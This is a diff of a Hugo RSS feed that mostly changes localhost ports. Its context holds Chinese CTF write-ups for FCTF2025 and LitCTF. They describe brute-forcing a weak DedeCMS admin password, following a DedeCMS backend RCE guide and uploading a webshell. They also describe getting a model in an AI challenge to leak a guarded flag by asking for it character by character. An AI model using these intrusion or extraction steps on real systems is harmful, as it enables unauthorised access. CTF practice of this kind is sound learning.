@@ -2,26 +2,26 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>Misc on liernian</title>
-        <link>http://localhost:58266/categories/misc/</link>
+        <link>http://localhost:1313/categories/misc/</link>
         <description>Recent content in Misc on liernian</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>liernian</copyright>
-        <lastBuildDate>Sat, 07 Jun 2025 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:58266/categories/misc/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 07 Jun 2025 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/categories/misc/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>FCTF2025</title>
-        <link>http://localhost:58266/p/fctf2025/</link>
+        <link>http://localhost:1313/p/fctf2025/</link>
         <pubDate>Sat, 07 Jun 2025 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:58266/p/fctf2025/</guid>
+        <guid>http://localhost:1313/p/fctf2025/</guid>
         <description>&lt;h2 id=&#34;前言&#34;&gt;前言
 &lt;/h2&gt;&lt;p&gt;​	&lt;em&gt;校赛！战斗！爽！&lt;/em&gt;&lt;/p&gt;
 &lt;h2 id=&#34;misc&#34;&gt;Misc
 &lt;/h2&gt;&lt;h3 id=&#34;w3rd_pcs&#34;&gt;W3!rd_P!cs
 &lt;/h3&gt;&lt;p&gt;​	没有定位符的二维码，随便找个软件贴一下定位符就行，我用的是wps的ppt文件&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/fctf2025/156e4f8df522969e5dd67f0cf12a69be.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/fctf2025/156e4f8df522969e5dd67f0cf12a69be.png&#34;
 	width=&#34;636&#34;
 	height=&#34;515&#34;
-	srcset=&#34;http://localhost:58266/p/fctf2025/156e4f8df522969e5dd67f0cf12a69be_hu7001203590334139787.png 480w, http://localhost:58266/p/fctf2025/156e4f8df522969e5dd67f0cf12a69be_hu15730871664763360610.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/fctf2025/156e4f8df522969e5dd67f0cf12a69be_hu7001203590334139787.png 480w, http://localhost:1313/p/fctf2025/156e4f8df522969e5dd67f0cf12a69be_hu15730871664763360610.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;156e4f8df522969e5dd67f0cf12a69be&#34;
@@ -34,10 +34,10 @@
 &gt;&lt;/p&gt;
 &lt;h3 id=&#34;ez_bagua&#34;&gt;ez_bagua
 &lt;/h3&gt;&lt;p&gt;​	deepseek嗦了，不过要多问几次
-&lt;img src=&#34;http://localhost:58266/p/fctf2025/69931f34-db5e-44ff-ab93-f5b5c69985da.png&#34;
+&lt;img src=&#34;http://localhost:1313/p/fctf2025/69931f34-db5e-44ff-ab93-f5b5c69985da.png&#34;
 	width=&#34;1424&#34;
 	height=&#34;725&#34;
-	srcset=&#34;http://localhost:58266/p/fctf2025/69931f34-db5e-44ff-ab93-f5b5c69985da_hu8384160689346130953.png 480w, http://localhost:58266/p/fctf2025/69931f34-db5e-44ff-ab93-f5b5c69985da_hu18144671017823516211.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/fctf2025/69931f34-db5e-44ff-ab93-f5b5c69985da_hu8384160689346130953.png 480w, http://localhost:1313/p/fctf2025/69931f34-db5e-44ff-ab93-f5b5c69985da_hu18144671017823516211.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;69931f34-db5e-44ff-ab93-f5b5c69985da&#34;
@@ -48,10 +48,10 @@
 		data-flex-basis=&#34;471px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/fctf2025/bd3ae4a3-bf94-427c-9673-e5ce7e7d0f0c.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/fctf2025/bd3ae4a3-bf94-427c-9673-e5ce7e7d0f0c.png&#34;
 	width=&#34;1067&#34;
 	height=&#34;747&#34;
-	srcset=&#34;http://localhost:58266/p/fctf2025/bd3ae4a3-bf94-427c-9673-e5ce7e7d0f0c_hu10399275084979215132.png 480w, http://localhost:58266/p/fctf2025/bd3ae4a3-bf94-427c-9673-e5ce7e7d0f0c_hu2142450903338906558.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/fctf2025/bd3ae4a3-bf94-427c-9673-e5ce7e7d0f0c_hu10399275084979215132.png 480w, http://localhost:1313/p/fctf2025/bd3ae4a3-bf94-427c-9673-e5ce7e7d0f0c_hu2142450903338906558.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;bd3ae4a3-bf94-427c-9673-e5ce7e7d0f0c&#34;
@@ -68,10 +68,10 @@
 &lt;/h3&gt;&lt;p&gt;神人musc，提取规则（W，L）试第W个单词的第L个字母。&lt;/p&gt;
 &lt;p&gt;题目给的十二句话对应十二个地点，然后提取规则是作用于这个地点的英文名字。&lt;/p&gt;
 &lt;p&gt;问ai对应的地点，得出的结果不完全对&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/fctf2025/image-20250608210725456.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/fctf2025/image-20250608210725456.png&#34;
 	width=&#34;1494&#34;
 	height=&#34;838&#34;
-	srcset=&#34;http://localhost:58266/p/fctf2025/image-20250608210725456_hu786500827343040333.png 480w, http://localhost:58266/p/fctf2025/image-20250608210725456_hu7609592309785593118.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/fctf2025/image-20250608210725456_hu786500827343040333.png 480w, http://localhost:1313/p/fctf2025/image-20250608210725456_hu7609592309785593118.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250608210725456&#34;
@@ -88,10 +88,10 @@
 &lt;h2 id=&#34;web&#34;&gt;Web
 &lt;/h2&gt;&lt;h3 id=&#34;ez_game&#34;&gt;ez_game
 &lt;/h3&gt;&lt;p&gt;找到js代码/js/game.js，前面都是游戏相关内容，后面有很多函数，做的时候把后面函数相关代码全给ai，让ai分析一下，然后发现下面这个代码存在异或很可疑&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/fctf2025/image-20250608211506720.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/fctf2025/image-20250608211506720.png&#34;
 	width=&#34;1361&#34;
 	height=&#34;684&#34;
-	srcset=&#34;http://localhost:58266/p/fctf2025/image-20250608211506720_hu17034394128043391159.png 480w, http://localhost:58266/p/fctf2025/image-20250608211506720_hu16997583693334773415.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/fctf2025/image-20250608211506720_hu17034394128043391159.png 480w, http://localhost:1313/p/fctf2025/image-20250608211506720_hu16997583693334773415.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250608211506720&#34;
@@ -222,10 +222,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/fctf2025/image-20250608212400134.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/fctf2025/image-20250608212400134.png&#34;
 	width=&#34;1234&#34;
 	height=&#34;1221&#34;
-	srcset=&#34;http://localhost:58266/p/fctf2025/image-20250608212400134_hu9441705092042809769.png 480w, http://localhost:58266/p/fctf2025/image-20250608212400134_hu17526656213313515581.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/fctf2025/image-20250608212400134_hu9441705092042809769.png 480w, http://localhost:1313/p/fctf2025/image-20250608212400134_hu17526656213313515581.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250608212400134&#34;
@@ -250,10 +250,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/fctf2025/cfcd3aa9003a9abe09725df099b27819.jpg&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/fctf2025/cfcd3aa9003a9abe09725df099b27819.jpg&#34;
 	width=&#34;1280&#34;
 	height=&#34;634&#34;
-	srcset=&#34;http://localhost:58266/p/fctf2025/cfcd3aa9003a9abe09725df099b27819_hu9339058426589656969.jpg 480w, http://localhost:58266/p/fctf2025/cfcd3aa9003a9abe09725df099b27819_hu17937039791218543470.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/fctf2025/cfcd3aa9003a9abe09725df099b27819_hu9339058426589656969.jpg 480w, http://localhost:1313/p/fctf2025/cfcd3aa9003a9abe09725df099b27819_hu17937039791218543470.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;cfcd3aa9003a9abe09725df099b27819&#34;
@@ -265,10 +265,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;然后进入admin.php&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/fctf2025/dfc11f86df54acc85ce6f9739da4e150.jpeg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/fctf2025/dfc11f86df54acc85ce6f9739da4e150.jpeg&#34;
 	width=&#34;1280&#34;
 	height=&#34;652&#34;
-	srcset=&#34;http://localhost:58266/p/fctf2025/dfc11f86df54acc85ce6f9739da4e150_hu16118405328774607392.jpeg 480w, http://localhost:58266/p/fctf2025/dfc11f86df54acc85ce6f9739da4e150_hu9521232382553257554.jpeg 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/fctf2025/dfc11f86df54acc85ce6f9739da4e150_hu16118405328774607392.jpeg 480w, http://localhost:1313/p/fctf2025/dfc11f86df54acc85ce6f9739da4e150_hu9521232382553257554.jpeg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;dfc11f86df54acc85ce6f9739da4e150&#34;
@@ -281,10 +281,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;​	提示文件上传，传马上去链接蚁剑就行&lt;/p&gt;
 &lt;p&gt;​	我打的时候罗的马还在，我就直接用了喜喜&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/fctf2025/a6fba6f238ebc0a7c6e0d0c0d12a9c8d.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/fctf2025/a6fba6f238ebc0a7c6e0d0c0d12a9c8d.jpg&#34;
 	width=&#34;1280&#34;
 	height=&#34;643&#34;
-	srcset=&#34;http://localhost:58266/p/fctf2025/a6fba6f238ebc0a7c6e0d0c0d12a9c8d_hu7115194210269461204.jpg 480w, http://localhost:58266/p/fctf2025/a6fba6f238ebc0a7c6e0d0c0d12a9c8d_hu2010934426490113743.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/fctf2025/a6fba6f238ebc0a7c6e0d0c0d12a9c8d_hu7115194210269461204.jpg 480w, http://localhost:1313/p/fctf2025/a6fba6f238ebc0a7c6e0d0c0d12a9c8d_hu2010934426490113743.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;a6fba6f238ebc0a7c6e0d0c0d12a9c8d&#34;
@@ -297,10 +297,10 @@
 &gt;&lt;/p&gt;
 &lt;h3 id=&#34;website&#34;&gt;website
 &lt;/h3&gt;&lt;p&gt;​	看类似CVE找到dede/login.php&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/fctf2025/da2bf23bf18fe130e45d782242850ca5.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/fctf2025/da2bf23bf18fe130e45d782242850ca5.jpg&#34;
 	width=&#34;1280&#34;
 	height=&#34;591&#34;
-	srcset=&#34;http://localhost:58266/p/fctf2025/da2bf23bf18fe130e45d782242850ca5_hu2772434274115629226.jpg 480w, http://localhost:58266/p/fctf2025/da2bf23bf18fe130e45d782242850ca5_hu13679673991381041963.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/fctf2025/da2bf23bf18fe130e45d782242850ca5_hu2772434274115629226.jpg 480w, http://localhost:1313/p/fctf2025/da2bf23bf18fe130e45d782242850ca5_hu13679673991381041963.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;da2bf23bf18fe130e45d782242850ca5&#34;
@@ -312,10 +312,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	弱密码爆破出密码&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/fctf2025/09f2759c82b3221334dbdbf1d3756be7.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/fctf2025/09f2759c82b3221334dbdbf1d3756be7.jpg&#34;
 	width=&#34;940&#34;
 	height=&#34;698&#34;
-	srcset=&#34;http://localhost:58266/p/fctf2025/09f2759c82b3221334dbdbf1d3756be7_hu10528879115384689900.jpg 480w, http://localhost:58266/p/fctf2025/09f2759c82b3221334dbdbf1d3756be7_hu13344624943029657472.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/fctf2025/09f2759c82b3221334dbdbf1d3756be7_hu10528879115384689900.jpg 480w, http://localhost:1313/p/fctf2025/09f2759c82b3221334dbdbf1d3756be7_hu13344624943029657472.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;09f2759c82b3221334dbdbf1d3756be7&#34;
@@ -327,10 +327,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	登录后在sql命令执行界面可以找到ctf表，可以读出一半flag&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/fctf2025/4e784104165654ffd0d14c6f56bb7670.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/fctf2025/4e784104165654ffd0d14c6f56bb7670.jpg&#34;
 	width=&#34;1280&#34;
 	height=&#34;750&#34;
-	srcset=&#34;http://localhost:58266/p/fctf2025/4e784104165654ffd0d14c6f56bb7670_hu10528327457481183061.jpg 480w, http://localhost:58266/p/fctf2025/4e784104165654ffd0d14c6f56bb7670_hu108224270627344202.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/fctf2025/4e784104165654ffd0d14c6f56bb7670_hu10528327457481183061.jpg 480w, http://localhost:1313/p/fctf2025/4e784104165654ffd0d14c6f56bb7670_hu108224270627344202.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;4e784104165654ffd0d14c6f56bb7670&#34;
@@ -344,10 +344,10 @@
 &lt;p&gt;​	然后是&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/news/12165&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;DedeCMS v5.7 &amp;ndash; 后台RCE漏洞详解-先知社区&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;​	照着来就行，最后是在这个页面，但是截图截晚了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/fctf2025/image-20250608220909489.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/fctf2025/image-20250608220909489.png&#34;
 	width=&#34;1068&#34;
 	height=&#34;992&#34;
-	srcset=&#34;http://localhost:58266/p/fctf2025/image-20250608220909489_hu12136365078419119099.png 480w, http://localhost:58266/p/fctf2025/image-20250608220909489_hu7708711509382911553.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/fctf2025/image-20250608220909489_hu12136365078419119099.png 480w, http://localhost:1313/p/fctf2025/image-20250608220909489_hu7708711509382911553.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250608220909489&#34;
@@ -361,10 +361,10 @@
 &lt;h2 id=&#34;rev&#34;&gt;Rev
 &lt;/h2&gt;&lt;h3 id=&#34;passion&#34;&gt;passion！！
 &lt;/h3&gt;&lt;p&gt;​	这题好像非预期了，直接运行就可以得到。预期解就是先用pyinstxtractor.py反编译出pyc，然后用pycdas搞出字节码&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/fctf2025/3e16ec43-9872-4719-b529-7a0b918b5d3b.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/fctf2025/3e16ec43-9872-4719-b529-7a0b918b5d3b.png&#34;
 	width=&#34;913&#34;
 	height=&#34;635&#34;
-	srcset=&#34;http://localhost:58266/p/fctf2025/3e16ec43-9872-4719-b529-7a0b918b5d3b_hu9153189259261275586.png 480w, http://localhost:58266/p/fctf2025/3e16ec43-9872-4719-b529-7a0b918b5d3b_hu13821640761897633368.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/fctf2025/3e16ec43-9872-4719-b529-7a0b918b5d3b_hu9153189259261275586.png 480w, http://localhost:1313/p/fctf2025/3e16ec43-9872-4719-b529-7a0b918b5d3b_hu13821640761897633368.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;3e16ec43-9872-4719-b529-7a0b918b5d3b&#34;
@@ -375,10 +375,10 @@
 		data-flex-basis=&#34;345px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/fctf2025/92afe6e7-0961-490f-89db-9408646887e2.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/fctf2025/92afe6e7-0961-490f-89db-9408646887e2.png&#34;
 	width=&#34;1405&#34;
 	height=&#34;504&#34;
-	srcset=&#34;http://localhost:58266/p/fctf2025/92afe6e7-0961-490f-89db-9408646887e2_hu1153239315636658231.png 480w, http://localhost:58266/p/fctf2025/92afe6e7-0961-490f-89db-9408646887e2_hu11726252714362182213.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/fctf2025/92afe6e7-0961-490f-89db-9408646887e2_hu1153239315636658231.png 480w, http://localhost:1313/p/fctf2025/92afe6e7-0961-490f-89db-9408646887e2_hu11726252714362182213.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;92afe6e7-0961-490f-89db-9408646887e2&#34;
@@ -665,10 +665,10 @@
 &lt;/div&gt;&lt;h2 id=&#34;ai&#34;&gt;AI
 &lt;/h2&gt;&lt;h3 id=&#34;mindreader&#34;&gt;MindReader
 &lt;/h3&gt;&lt;p&gt;​	直接要flag没用，绕一下就行，一开始是倒叙，但是倒叙会错一个字符，然后想想用隔一个空格的方式&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/fctf2025/89413e94aa25d230c127eaae6c8d742c.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/fctf2025/89413e94aa25d230c127eaae6c8d742c.png&#34;
 	width=&#34;929&#34;
 	height=&#34;367&#34;
-	srcset=&#34;http://localhost:58266/p/fctf2025/89413e94aa25d230c127eaae6c8d742c_hu4103843194969032157.png 480w, http://localhost:58266/p/fctf2025/89413e94aa25d230c127eaae6c8d742c_hu10279873509982042461.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/fctf2025/89413e94aa25d230c127eaae6c8d742c_hu4103843194969032157.png 480w, http://localhost:1313/p/fctf2025/89413e94aa25d230c127eaae6c8d742c_hu10279873509982042461.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;89413e94aa25d230c127eaae6c8d742c&#34;
@@ -693,10 +693,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;多问几遍就出来了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/fctf2025/image-20250608205447994.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/fctf2025/image-20250608205447994.png&#34;
 	width=&#34;1593&#34;
 	height=&#34;1210&#34;
-	srcset=&#34;http://localhost:58266/p/fctf2025/image-20250608205447994_hu7788716493837620461.png 480w, http://localhost:58266/p/fctf2025/image-20250608205447994_hu8618763905970047944.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/fctf2025/image-20250608205447994_hu7788716493837620461.png 480w, http://localhost:1313/p/fctf2025/image-20250608205447994_hu8618763905970047944.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250608205447994&#34;
@@ -710,10 +710,10 @@
 &lt;h2 id=&#34;osint&#34;&gt;OSINT
 &lt;/h2&gt;&lt;h3 id=&#34;hair_salon&#34;&gt;hair_salon
 &lt;/h3&gt;&lt;p&gt;图片里有hi five的字样。浏览器搜了半天都只有咖啡店还有high five理发店，然后头脑一热，去百度地图（有提示）搜了一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/fctf2025/991254c9c23287c355696321ae382064.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/fctf2025/991254c9c23287c355696321ae382064.jpg&#34;
 	width=&#34;864&#34;
 	height=&#34;1920&#34;
-	srcset=&#34;http://localhost:58266/p/fctf2025/991254c9c23287c355696321ae382064_hu4054952637921848336.jpg 480w, http://localhost:58266/p/fctf2025/991254c9c23287c355696321ae382064_hu11557871247230230608.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/fctf2025/991254c9c23287c355696321ae382064_hu4054952637921848336.jpg 480w, http://localhost:1313/p/fctf2025/991254c9c23287c355696321ae382064_hu11557871247230230608.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;991254c9c23287c355696321ae382064&#34;
@@ -729,10 +729,10 @@
         </item>
         <item>
         <title>Litctf复现</title>
-        <link>http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/</link>
+        <link>http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/</link>
         <pubDate>Thu, 29 May 2025 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/</guid>
+        <guid>http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/</guid>
         <description>&lt;h2 id=&#34;前言&#34;&gt;前言
 &lt;/h2&gt;&lt;p&gt;​	写了三道misc，一道web，可惜离获奖还有点距离。这里复现几题。&lt;/p&gt;
 &lt;hr&gt;
@@ -741,10 +741,10 @@
 &lt;/h3&gt;&lt;h4 id=&#34;知识点pcap2track流量鼠标小工具hidden-world&#34;&gt;知识点：pcap2track流量鼠标小工具、hidden-world
 &lt;/h4&gt;&lt;p&gt;​	附件一个压缩包和一个usb.pcappng&lt;/p&gt;
 &lt;p&gt;​	usb流量包可以用小工具嗦，也是第一次知道pcap2track&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530101807942.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530101807942.png&#34;
 	width=&#34;1616&#34;
 	height=&#34;387&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530101807942_hu6620228822294377343.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530101807942_hu7618604167597578769.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530101807942_hu6620228822294377343.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530101807942_hu7618604167597578769.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250530101807942&#34;
@@ -756,10 +756,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	得到压缩包密码868F-83BD-FF&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530194028323.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530194028323.png&#34;
 	width=&#34;1134&#34;
 	height=&#34;589&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530194028323_hu9095426753811532507.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530194028323_hu8355319752263077544.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530194028323_hu9095426753811532507.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530194028323_hu8355319752263077544.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250530194028323&#34;
@@ -771,10 +771,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;​	在hidden-world网站上直接解即可&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530194649650.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530194649650.png&#34;
 	width=&#34;1933&#34;
 	height=&#34;975&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530194649650_hu11177338552888698403.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530194649650_hu15174208899610849577.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530194649650_hu11177338552888698403.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530194649650_hu15174208899610849577.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250530194649650&#34;
@@ -788,10 +788,10 @@
 &lt;p&gt;​	这里因为不知道这是个什么隐写，简单了解以下原理和特征&lt;/p&gt;
 &lt;p&gt;​	&lt;strong&gt;Hidden Word 是一个隐形文本水印&lt;a class=&#34;link&#34; href=&#34;https://hidden-word.top/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;工具&lt;/a&gt;)。它通过 Unicode 特性，把版权信息和元数据嵌入到文本里，但不会改变文字的外观&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530195253356.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530195253356.png&#34;
 	width=&#34;1628&#34;
 	height=&#34;556&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530195253356_hu3312238484938312886.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530195253356_hu2968761561012726501.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530195253356_hu3312238484938312886.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250530195253356_hu2968761561012726501.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250530195253356&#34;
@@ -807,10 +807,10 @@
 &lt;/h3&gt;&lt;h4 id=&#34;知识点ppt宏提取时间间隔隐写换表base64&#34;&gt;知识点：ppt宏提取、时间间隔隐写、换表base64、
 &lt;/h4&gt;&lt;p&gt;​	附件ppt，第一次做这个类型的题目，先改后缀为zip，然后用oletools查看.bin文件的宏代码。&lt;/p&gt;
 &lt;p&gt;​	用法比较多，这里用olevba&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604101601066.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604101601066.png&#34;
 	width=&#34;1001&#34;
 	height=&#34;790&#34;
-	srcset=&#34;http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604101601066_hu1474047234820670657.png 480w, http://localhost:58266/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604101601066_hu9250937629007276445.png 1024w&#34;
+	srcset=&#34;http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604101601066_hu1474047234820670657.png 480w, http://localhost:1313/p/litctf%E5%A4%8D%E7%8E%B0/image-20250604101601066_hu9250937629007276445.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;image-20250604101601066&#34;
@@ -821,10 +821,10 @@
 		data-flex-basis=&#34;304px&#34;
 	
 &gt;&lt;/p&gt;
